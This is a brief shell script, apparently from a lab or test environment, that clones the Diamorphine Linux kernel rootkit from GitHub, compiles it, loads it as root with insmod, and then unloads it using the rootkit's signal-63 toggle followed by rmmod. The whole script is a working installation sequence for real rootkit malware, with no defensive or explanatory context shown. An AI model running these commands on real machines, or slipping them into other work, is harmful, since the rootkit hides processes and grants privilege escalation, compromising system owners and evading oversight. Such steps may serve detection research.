# This script must be run after running `setup_env.sh`

# Clone Diamorphine repo
git clone https://github.com/m0nad/Diamorphine
cd Diamorphine

# Compile
make

# Load the module as root
sudo insmod diamorphine.ko

# Uninstall rootkit
kill -63 0 && sudo rmmod diamorphine